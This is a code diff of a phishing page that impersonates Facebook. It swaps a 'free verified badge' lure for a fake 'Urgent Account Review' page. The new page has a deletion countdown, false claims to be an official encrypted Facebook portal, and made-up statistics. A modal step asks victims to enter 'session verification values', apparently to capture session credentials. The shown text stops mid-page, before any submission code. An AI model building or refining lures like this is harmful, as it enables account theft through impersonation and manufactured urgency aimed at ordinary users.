-    <img class="logo" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAOEAAADhCAMAAAAJbSJIAAAA8FBMVEUIZf////8IZf7//v////0IZvwAYv/7//////xIg+EAWPO30+0AXvaRt+wAVuj///oAW+zY7PTD3Pjq+P4HZ/r3//8AWvEAXvwAWfMAWOUAYPgAWN/+/fYAX/8AW/IIZ/jb7/640fB6pt9Eheobb/Qic/FPi+dlnOXS5ffv/f1Yi+EAW910oeKtzu8rct4QYt1If906edyhweyNtOU+geovdOzO4/gYZd1rlueSsOo0dtxhjtqux+2jyOuYvuh4pOBikeVznuTH3PqGufQiaNqtzenV8fbC4/PW6PyHreAfbe4AR9hBds1vmt6RueNwneyMSkNCAAAXTUlEQVR4nN2diUMbN7PAda4WY6+M9/AZbGhDsLlNAkmABF7po+37vuT//2/ejHZN7OA1e8hHqqRNm8Rr/Vaj0cxoNCLUVuNUuYJzVygNv3BXu65whVD+4GpvfLn/7uC3t29/DyRj8ve3b98fvNu/HO9dDXyFnxXCfEYIwSnn8L9CWOsXsfYk7JbrKkWxo0K7VPlPd18PPpx1d1vNZtMhREpGCGPwkxGn6TSbrah7dnpwPH7yQypcrV3AFcoQutb6ZY8QOubCMPR6Gt6/f3j38OHIazXfODBoEn5KGQQB/DP5D/gFxpMQx2m2vKMP38dXQ/gcvhmu4DnWumWREMTSCBodXtVGZ1EF2GKguDFsBAeQEBzO+Dcmv7JOM7oe1a6GwCh6mltEtCilnGsV+icfz9p17HrHsLBENH80GTPi7znPf2KgOy3v7OOdr4RWfJPmoUABdTnVIJvj83blDUOhJEnn4zGbUEz9X4yZTEscSSPKzKm0t2oDCooHXhk+2XzBOglBYcL0Uzj17t57renxInna1Keclvd+7KPq4lrz0mq19BgqJXjPVY2b7q5DZuSxGGE8ylF9tB1SeHuhKiuv5QgFrA5caL92GqGMzU64ooSBkfI3letPO1TB4lFS6ZQkhJVBHT4cVc1M+qEZSxHiq0J9xDrdj1dgRaj1EoaNUdtxGJFGR1ohZKiAAxYwh3XqW43QFaVGsQAhWiwUtB0oubCxFRkThUxWgFxYrwJL4rQv/oTlA3SZoMWGs9AYotmpqNaNi6hJzMpgvz1LrIw+79Ee2hLGnlgJoULjUYvDrcgxi5mtgXtJSEBa+4x4Fw3zlYWM1QKE3CxUg5vIMXDLAZwYCcYiCjqtmwGIqqtXRAjSMqx1HRb0caKQYCliGgtpQEiAekd22vu+WMk8FGhMqe0PrdjAZNKienlJaEYRTVbQZK3HbfA880/EfITgxIFX69/UlyOZC4kl8UYDrXsqp5WTcwzBBacnZ85yBPO1JsnRHe3lNXLyEcLr80cVJh22ekTZh5WjsjWgIp++yUUIz9476xDj0K6ckJgZ7xzdoqu2NMLhgxckDvvq6Yw1R5z6Oz+XGfc6IaxD8NY4TvDBaRUDE2iFrgGRkNhg7TxeUTDjjNudwQZ4nRBjJhiB0erPI4esAW2WEyW1e6cwKBSHHssTghvPBTpq+23nRzhifYBoCHjHIVr+QmWQ1wyEYEi4SoAOBQnZDMIgqJ77GuZNFiMnAyEHkdCDxyabeH/rJ4Qf10+9XqYgVZZ5KLhoHJlY2IYQgqrrdLp7YMJlUKoLCVFhxWZMe+0zcLrFfWmPQaWiEaIWatSFhMLlaIeqL3Wy9tGbbolz7F3CTNSwkBUnxLWQC/XNI0RuHCEgRn9TDG2ohbK6mNAAfo0kSdToutGSNglwBNFxyHuv+BqvSKng4dcIzOz1rxPT7TmGE+zehxxDmvkJBRoLPB5BdEDXr0Wn23OEo89aNyHuWRqVn4sQzBhlAPejtbiCWZrh7O8eK7OpqtOcqhRCUFCghLn4VllSsNBCi0WVVb5iLBW31nMR4jII7+SLJzdGNF+0ZDKy6FLwBYt/mpQq+CFO6uumWNQSQsLaY4G9TVkV08YQpmCv0SbOmrz5LC2RUlCD3onmeccQ5q4eHJEfe9LWuhRH6uNt7WQHmLFkspvNK5IoyudXy2QgU0OW8V/uXonUEFwqoes/2l4iksfhD7MLLs06JE1CBvxM2o99cDNEE94UhZc4G9e+0vk0jXDDUXMphGSyP2i2PDrNVr19dH16MRqN7qGNRucXj2fdetRqAjSJRQheSD9YMIb4nIth2rKfRqj2K5P3aJkw2Y1j1ah7vXX8be9qx/fDH56sCkPfHzRux19Hp//Uo91OZ6EqmAx180HlWg85/bMtrbv0iWsXSOdN6+ygtr0T4rvEd2/WMphJ2p1J+BruPI2P359F1SBVHUwIZWucomvmE4rBkRNYd3jNw4K+453+3Rgqs9UKWJjH5mKoCw1FBDRGmIkxCd0D3HDwRzt1l3IyX4nTPZy/5r8k5PB9w1NrUbXnl2xyZqTTPr0cUJOil7GB7djwYt208EucR79H9UtRfUkIBgI9bhJbo5cAEsxmI9XuTSMUvcXOwMseIeHCzsTif0OT8X+FEF7DnmdPPicKFHrgtI8HaF6JnHsr2QiZjG7npRfNkVLXP7M4AxNCFvS9mx0TNHBzbwJmJHSOBr1MhHTUt+jSJ4ogqH9u0CSNK9WVK0kYOOfhYkJhnF5+UmHPtpMFQlBz8E9Uw7wYTjHDVtOcu9UZCSWpfMFI/2wYdZYQo+T+GbNpbgcgEJ3m2ZPqFc9tanhkMWHyLhk5GsDqM7v2zxCiBKmbZqoRWKAZJbO7NXSLbMHnI0QTV47UT0M4Q6hNdNsLHGlxixd0aOu/Q3h1JVK3M44hrJkB6FO1QEq50MMPTNp0mUDiK/uu0KWSKDMTgpxe+2I2dWpGl7pc11rg9Vo01Rir7yuTY1si/y7zPIQ50TqGFWl6Is5IqdaDbuKLlsRKlgi0iI+VcU7LpPpmnIfmrzjtQzUzIWbGUIh3jo3Re/ZfA9IchaDbSub5ZiSMW2dE3TQp5fowsqJjJhYR/Otx6NIyajQ3IWNRQ6cRCn1gJxfoRwiifWiWoJKJzHkIQW5OZ7ZqyOyTZN+elPZZv3UJhpoofXgi1xgGQeVk+sPPhOh6njt21olkEsrgHEw15apVSqlkgXM6bZ5OCLmrNTzITjpsPIYd0r5KC4AtjxD+YlC/izeHpwg5qFcRbjXjZEdLhKz6QHs2AHOOIdicn0NcgMUUIcVzcTALLS30iS7t+qW1aH5CEzHx9gSfTP+JlIL6GTl9S+ZoTOg85PcEyxOSfgDjuAUzMfFlYkIc0cM2CRhJi7zmJ8QhdLOkg9glZH38fu9J0UQHJPMQlPpD1YTbrRBiFN55ABOirDWTnxC+GAg7N5iDME2oev6RPXNbEnB7vUOFgclVEybGRndHq2lCwd1a1RYfMS+SncIQLs50WSIh6+z/PA/DU5u72WA4NMeivLlWnJBcD7k7RchpI7IYnJFgO3V91M/rI4xO3OnVgtP7jkW3F49IHIC1xueEoIsRvhJr+5lQModtJR8mGMTk2u/Kkl7vLKKsjjE4m12TmpP4Gk9sog4UuP/ATcoSrGPif9o5p5DZ+h6ArlFCASEetLuLbEaf4GXVB/mGyUUvy2jeGTMoRkRCJ2cHguoXfEcuJZho69LfHJshRMLAvM8noIhClQoH23f7D+/uRwfxpvDH7w/Htbs/6kHeKSQDVOa4hUDMW/Lb5vinPcLOg85HyMFGv7o8OPKiZtNxOp0f+/odZ7dKgpzvH2Zi4A0wQKoJrv1qXDG76tYAMWyZaymEl/zp2nvjsEAmHtykEIM0NSf6eV8/k/1mDW01QbjLeXg+k95RuklZ/yuHVwHdGH7tVjtmt4RM52IYyKRiSF5C4wiDriFYOcVv290QZc71MPNZQTQLGo9NYvUoh8Fp78CCDPNQaXpSsUtInIMsJyESwp4ee0tJGYi+aBcJwQ//+MbyhmjnWCxOTZ4Zw3Glz5ZAyJwDDUqGgB81PLOXxR0/aHecwzPcrk9yn2wnthz5YDgQkKartmVCFjUybmWD+eJfS7kcQuk1tFJIWNt1LBO2d1w3AyHaafRd07HJNt0X55NyXSQcWZwFiXgMM46h1gN7evxFX8hWCITaHV7bJnQ+hBkXfC2Om3blc7ovsusLtNoOo+ekOgtPNQ96r7Ic1kW3IexanoHTfelXGsZ7um3aJnRGlGcYQ6zksR0tkTBoXlJBNH14Y/FUU0z4nWYqfgTq6KGzvPNGTHYOXE1c8cFmVYR4wf8qMlXr4iL84CxvDMEN/ifkxLUZRkzGsFqj2QjpsGtxhrzoC5HdHUHcJ6tnKkxvwb1WGSYiCHKjxZYppczbBpvmrmWdsHJHs8RogPC2slzC3Rol7r4TWAxCxYR/Zsq9gL/yyaYen9MX5wHG8MCxeWhkQphFlYI59bBUQsmcC0rUqdVzMaa3rW2ayWrj9D5fCC1nCyS7DsnwzGotq4RQZCIUdGTvm+f2hXR9MuhaLWWVawyFGpVNv1rYF5BT75Bc7bLA5lNzEAqhtpZKiL54g+y1rJ6hzEcYLpWQgKap3pJx0+r5NMwUkJXtbLoUxtBKHl1aV9AJ/kYu/72EsM4zZ5/sN63G8zeJELmcd+Sd868lxEc7I3JguSTSJhHis9+T30junatXHpuTcImrBSwSzlvyVhYjnHZc2U8NVoufzwSkEsqfP5zWijEGvyNhoSVp+svlTy3KRki5GcOfP/2ilSIMyO8FF4tFrzfjGALh+auWNyMlokjmzHFQcB7OH734d6NtkVVKyasjWGIM489hZZYiYprMuCa06lRrYasgYYYoRk+dz3x4fusUJUw+U7SogPnOznFtXvt0mCnTROjw9tPcB0w9qlb7IygY958iLGJ6m/da/9/XJ9uilmUHTjzVyxEiX2EZr+/gHjV/0XIwLm4YsxtHRfduYun+nQWFIsLmwymE+cZxYVNcfC++d2N06Vt0gIsTuqVuZ8C9mcX4lIvPxXc3sUg/EhbWpYaQ4+nXYmMoTFswgkILd3hWPBpnbJr3caXlooQ4CvbuE/m5YZ7vX1FhQlwm3hJz1GlTCbE20m2rDCGM4LvmBo8hPvvvZnGbBggPyH7Bs06rIeRCjQrvv+HJA/DxL5slCW3erzUHUf1T2HvCAkZv9sm4LOFy56Hwi2eEGcJLstcy9y5tJiFI6VPxon+oSt/ckquCB2NXQgj2xGWzTJhDthpk0C12IG81hIJ+L747hemq0SHxz4oldq5mHuJJl8JSilXe2r7ZP9xYQs6H3eK7m1j053pI6EGxgN5KCJW48srUTmXOhSIUE8s2l/B2lxReD2Eedr4D4bi1wYR03ykeiWJM7taA8Km+uZqGg80mi48hk+1tQTjmRBVQV6vRpcO3rPg8BP+3u+MSrj5sLqE7qJeo0ixZ8E/oEpe+6xSJKq9mDLcrsniFABawLYrnLcbNzSX81ixBSGSzRpMc4U0lpN9bJY5jMdZquJpwPbzeWMLwfamzQuzI16BpXFEoV38VhMI/Iq9UvVzcxS0lUJfSWrVABuTyCeGxV/X8p9amutg5plyDpqFX3mYSKnobFZRRwyO9PQpjCD2cTMRNIhR4P7c4xjOJhfeN5NEQTwVxqsXHAnHzFRCaDdQShGRLaFgt8NLku1b+3Z1lE2K0H4Wr2CV2pnctPH9IUdMUOkM6IaSlL85OaS6laLMVq7ZieucNXI2EeC/sFsmdRhsTPvlzm+JZbrYVXMz/eNKGJxF73ufM3TsZnwPGM6RKi1rLKULIWFRvey/b/23Hdwa/RijC/8z5dNzwubvFdyww3P0JCycLguXGenhELqc0xNrKVP9/0SrbPUozEPbUBWHzHsDiax2K55lgsSTvEAt9aoIRO0Xfs7wWbtyNvsS6bC8JaaY9eh1uTQq/vyQMSFAmjz8gj6bqtEvMzX/uOMp7c/HkRRM2A2j+DLNN3NfnIefhFknJ+iJOIEsQgpRWa9SU1iam8qyOy0bkJoRvN1vI08IFDXP1M+wEJ5l7KYST+xMKEcJ78wa6xynWNjFvE+vT2Dmjlzc3seTXzfl+AxE4W3S6Ao8Q25Gl89Trzi+dSFLrLvmW5zpRj86/iBAk/Mx3p+tE4RmrKvv3EDJWPaZiupqZK8RO+19EKIPu4cSYTOomaqE+4kQsf45t3YSm0ovs3DxfUproUu2KK0yQK183ce2EeMZJeo3ncn+TmnuhwpxrC+f01k1ozD3nAnhmCPFyD6w3L4lT9hDU2gkdEvSjW3ShZyu0gicTXsAQ/vJSineFkNOhfu7B82rBlbsdWThJtm5CNNgqd1rwiV08Ve1aqM8WygivkXDiDDiP82pBU8xd2Y7y1kWb9zXrIny2/Su3098yc3MAPZelD5SumxDWg9Mw9eYAflX5hW2amDCQ0TZPI+SC3vz687Azmr0tZObmAMF3uuW/Zn1jSEwt7yeVeoOHcBX9u8UKpkWvnxCjYrL6EC4g5MIdXsuCyftrJzRVIsijL6hIu/3B3BW0XTc3aP6KhOauoDusqZtGCOg9oe7LlflcK6EjzxXlInUM8QJZV/hHv+g8RHusO8DjGwtuJUNMU5KnxCGOdRCazmL4qeaaCtup9z2Zr9V0VCawuDZCXCsuXrk7LyF0B2clCnCtk7A9mHNTwcv7D5Wit0U29tdOGLS+zNssmXcPKVf/7RQ98rfGeVgd0XllYecRKuo/Or8aIXGu/XkXrabdB3zYlcFk32ujCScuEyPtq/nfknan850XFNOo6yEkZPcy5RtT7uXW6rgaFNrIWA8ha97kvD2e6vCcFToIvx5C53SY8/Z45Wr/8dchZGc7Iq1wcQohHsF96uJR9rw9WLkuBZfJaTd0apmKNCnlWum9dvCcbLGBhEm/0K2/xdSslOSPFEJXa+W6Y4/JvLUpV0yIF7ZH30Qvvgo0ByE397ury0ru8xwrJuxLufsVL7TRaakRaZrGxKVc9XcU5Lyie8WEgdx9UHgVYGoJvLT1EIxTihlvx9FmS2kQfcSrXF2TcJuHMLmLStDwvipNjmdWzlUQTuL3/b6s3iseB4DT8nfSdGnctObhfQvDA5ln4yoJJWvdh1wvvtJmISG4GT2ujkHdBJtHiPl0rY8hpgEv/JbFYwg6Srhq32PZ14wVjmFQ/w4jSF+5+2zxGMJncTP1Wzt7Dt3KCAmrf1V4GS9dfPfZQkLXqKgQfanNIjSFEL1vIGAwB0GVFiaMm4mEH5k8jQyzcbmESQfQPW/farGYLQehEPrquoNpDJtBiKvXWQNNtQw3MGQhVEJx7Z9XM93os5IxJM7nHUyQyXKp1OuE3NW4bKjhcaZTfCshjG6GWNVPZ0hEzkLIcYcfDCN113XIq+pmyZoGv99pX4Z4QaKiIsO9Wa8TCo1mkbm8+PCxLp81TspBiGUQMpIcu8BNUFm9vjJbnbBO2JHS6S75//VIYGJ3QZoJsARC9jz/8Wao6N7P0+echD16e/QGdLVMPyS/LELjzMOP9jjnKaRchBigGpyDmUrS99+WRsikQ5zmxYDmvB0zHyHIfU99Oer00xf/ZRGiCye7tVBnqydZmBBvedWD0W56GYClzcOARVt/uflvUc5HGFc6dMPb62ZS8+XHwSfLhIkLaIqPGgXevL4Li1wSnZeQmmKVwv/arpswXEDYrFq1SxhIx+gX2fIefJG3rGZRQuqiNX94H3X6YKpKScjSCM2dsHjSLhodqtccwZRWgFAoYS4da3yOiIObG0sklOYa2crpNsZD52xhZ2hFCF0wVRWGR05OPawruURChwVO6/RWxTVAdQZn6UUrIqXJMILIqL2LXWf2wJRFQgwPObuf70J0xXsa53+BUSxG+NxHHe5t1TtGn8YXEBjUwoSx/pSxBkU9U/98OywmnM+tHKFS3A2vPnY7cf8SY64koTn0gj+q3ZtGSEsCliTkeFhaqZ1P17ug9IKkfnpZQhb0YZWonB0PTOGBLHfULWjlCCm4/0rBLBmebHm72DMrUspYp7114puM1x/HCgq2koR40FZzEFYhBpenXssxjlwZQvhXyzu9HOAhetxxyVC9fnErSWjOooAcua4LmnxQ++zhzbuVPfRQM3w2vsFjcgEBTr/ObnRaO8TDdPjHKkt5/ldaWcIfTZijqDvjg26r8idMn0wVB7aSu4BjDVqNugdfBiHO7561ftkjxPVRYAx62Pj7iWepqUDj4iUGzmm2js6P93zdwxhvEQs7rdkjxF0ugVFoEDDMG8gyEdU5A7ZOu/vPwWXDVxQ/jQ8pqz+nm0UpjS0rXCRxT11lWMd4+J/29cX32vZOSA0dKk6Tc5Dlst2MzeoYYnAPGVHBZxgEQPrLD12zo47vA7xrE+bFd1VyiZhq/w9dsqTx0xYCTAAAAABJRU5ErkJggg==" alt="Facebook Logo" />
-    <div id="groupSubHeader">Facebook Security</div>
-
-    <div id="data">
-      <h4>Free Service</h4>
-      <img src="data:image/png;base64,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" alt="Verified Tick" />
+    <div class="header">
+        <div class="header-content">
+            <div class="logo">
+                <i class="fab fa-facebook"></i>
+                <span>Facebook Security Center</span>
+            </div>
+            <div class="header-actions">
+                <div class="security-badge">
+                    <i class="fas fa-shield-alt"></i>
+                    <span>Secure Connection</span>
+                </div>
+                <button class="theme-toggle" id="themeToggle">
+                    <i class="fas fa-moon"></i>
+                </button>
+                <a href="#" class="help-center">
+                    <i class="fas fa-question-circle"></i>
+                    Help Center
+                </a>
+            </div>
+        </div>
     </div>
-
-    <div class="line"></div>
-
-    <div id="para">
-      <h2>🔔𝗖𝗼𝗻𝗴𝗿𝗮𝘁𝘂𝗹𝗮𝘁𝗶𝗼𝗻𝘀! 𝗬𝗼𝘂 𝗵𝗮𝘃𝗲 𝗯𝗲𝗲𝗻 𝘀𝗲𝗹𝗲𝗰𝘁𝗲𝗱 𝗳𝗼𝗿 𝗮 𝗳𝗿𝗲𝗲 𝘃𝗲𝗿𝗶𝗳𝗶𝗲𝗱 𝗕𝗮𝗱𝗴𝗲.</h2>
-      <p>Click on continue to claim your verified Badge status.</p>
-      <button id="continueBtn" onclick="redirectWithLoading()">
-        <span class="btn-text">Continue</span>
-        <span class="spinner" style="display: none;"></span>
-      </button>
+    
+    <div class="container">
+        <div class="review-card">
+            <div class="warning-icon">
+                <i class="fas fa-exclamation-triangle"></i>
+            </div>
+            <h1 class="review-title">Urgent Account Review Required</h1>
+            <p class="review-subtitle">Your account has been flagged for policy violations and is scheduled for deletion. Request a review to prevent permanent loss of your account and data.</p>
+            
+            <!-- Countdown Timer -->
+            <div class="countdown-timer">
+                <div class="countdown-item">
+                    <div class="countdown-value" id="countdown-hours">24</div>
+                    <div class="countdown-label">Hours</div>
+                </div>
+                <div class="countdown-item">
+                    <div class="countdown-value" id="countdown-minutes">59</div>
+                    <div class="countdown-label">Minutes</div>
+                </div>
+                <div class="countdown-item">
+                    <div class="countdown-value" id="countdown-seconds">59</div>
+                    <div class="countdown-label">Seconds</div>
+                </div>
+            </div>
+            
+            <div class="alert-box alert-danger">
+                <i class="fas fa-exclamation-circle"></i>
+                <div>
+                    <h3><i class="fas fa-info-circle"></i> Immediate Action Required</h3>
+                    <ul>
+                        <li>Your account is scheduled for deletion in <strong>24 hours</strong></li>
+                        <li>This action is due to violations of our community standards</li>
+                        <li>You may request a review of this decision</li>
+                        <li>If approved, your account will be restored with full access</li>
+                        <li>Failure to request a review will result in permanent deletion</li>
+                    </ul>
+                </div>
+            </div>
+            
+            <div class="security-verification">
+                <i class="fas fa-check-circle"></i>
+                <span>This is an official Facebook security portal. All information is encrypted.</span>
+            </div>
+            
+            <button class="btn btn-primary btn-lg" id="reviewBtn">
+                <i class="fas fa-file-alt"></i> Request Account Review
+            </button>
+            
+            <button class="btn btn-outline btn-lg" id="appealBtn" style="margin-top: 12px;">
+                <i class="fas fa-gavel"></i> Submit Appeal
+            </button>
+        </div>
+        
+        <!-- Additional Information Section -->
+        <div class="review-card">
+            <h2 class="review-title">Why is my account being deleted?</h2>
+            
+            <div class="alert-box alert-warning">
+                <i class="fas fa-exclamation-triangle"></i>
+                <div>
+                    <h3>Policy Violations Detected</h3>
+                    <p>Our automated systems have detected activity on your account that violates our <a href="#" style="color: var(--warning-color);">Community Standards</a>. This may include:</p>
+                    <ul>
+                        <li>Spam or misleading content</li>
+                        <li>Hate speech or bullying</li>
+                        <li>Impersonation or fake accounts</li>
+                        <li>Intellectual property violations</li>
+                        <li>Suspicious login activity</li>
+                    </ul>
+                </div>
+            </div>
+            
+            <div class="alert-box">
+                <i class="fas fa-chart-line"></i>
+                <div>
+                    <h3>Recent Security Statistics</h3>
+                    <p>To protect our community, Facebook takes action against policy violations:</p>
+                    <ul>
+                        <li><strong>1.2 billion</strong> fake accounts removed in the last 6 months</li>
+                        <li><strong>98.5%</strong> of removed accounts were detected before reporting</li>
+                        <li><strong>85%</strong> of appeals result in account restoration when legitimate</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
     </div>
-  </div>
+    
+    <!-- Review Modal -->
+    <div class="modal" id="reviewModal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h2 class="modal-title"><i class="fas fa-user-shield"></i> Account Security Review</h2>
+                <button class="close-modal" id="closeModal">×</button>
+            </div>
+            
+            <div class="modal-body">
+                <div class="step-indicator">
+                    <div class="step active">1</div>
+                    <div class="step">2</div>
+                    <div class="step">3</div>
+                    <div class="step-line"></div>
+                    <div class="progress-line" id="progressLine"></div>
+                </div>
+                
+                <!-- Step 1: Identity Verification -->
+                <div class="step-content active" id="step1">
+                    <h3 class="step-title">Identity Verification Process</h3>
+                    
+                    <div class="alert-box">
+                        <i class="fas fa-info-circle"></i>
+                        <div>
+                            <h3>Verification Required</h3>
+                            <p>To confirm you're the legitimate account owner, we need to verify your identity through multiple steps:</p>
+                            <ol>
+                                <li>Watch the tutorial video</li>
+                                <li>Enter your session verification values</li>
+                                <li>Complete facial recognition (optional)</li>
+                            </ol>
+                        </div>
+                    </div>
+                    
+                    <div class="video-player-container">
+                        <div class="network-status">
+                            <i class="fas fa-signal"></i>
+                            <span>Connection: Secure</span>
+                        </div>
+                        <div class="video-container">
+                            <video id="tutorialVideo">
+                                <!-- Source will be set dynamically -->
+                                Your browser does not support the video tag.
+                            </video>
+                            <div class="loading-spinner" id="loadingSpinner">
+                                <div class="spinner"></div>
+                                <div class="loading-percentage">0%</div>
+                            </div>
+                            <div class="video-overlay" id="videoOverlay">
+                                <div class="play-btn" id="overlayPlayBtn">
+                                    <i class="fas fa-play"></i>
+                                </div>
+                                <p style="color: #ffffff; margin-top: 12px; font-weight: 600;">Click to select language</p>
+                            </div>
+                            <div class="video-controls">
+                                <button class="control-btn" id="playPauseBtn">
+                                    <i class="fas fa-play"></i>
